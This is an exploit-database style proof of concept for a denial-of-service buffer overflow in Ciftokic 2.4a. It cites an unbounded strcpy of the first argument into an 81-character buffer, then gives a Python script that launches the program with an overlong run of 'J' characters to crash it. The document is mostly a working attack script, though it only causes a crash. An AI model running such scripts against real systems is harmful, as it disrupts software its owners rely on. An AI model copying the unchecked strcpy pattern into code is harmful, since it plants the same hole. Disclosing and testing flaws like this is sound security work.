# Exploit Title: Ciftokic 2.4a - DoS Buffer Overflow
# Date: September 30, 2019

# Version: 2.4a
# Tested on: Ubuntu 18.04

'''
If we check the ciftokic.c file on line 52 we see the following code: char CIFFile[81], *Tmp;.
In line 84 we have the problem with the following instruction: strcpy(CIFFile,argv[1]);

If the first argument is 80 characters or less, nothing happens, but if we put from 81 onwards the program fails with a Buffer Overflow.
'''

# To test the code use Python 3.6+
from os import system
from sys import argv


def print_usage():
    print("Usage: python3 ciftokic_overflow.py <characters_numbers>")
    print("      |_No Buffer Overflow: python3 ciftokic_overflow.py 80")
    print("      |_Buffer Overflow: python3 ciftokic_overflow.py 81")

if len(argv) == 1:
    print_usage()
else:
    try:
        number = int(argv[1])
        payload = "J"*number
        system(f"ciftokic {payload}")
    except:
        print_usage()
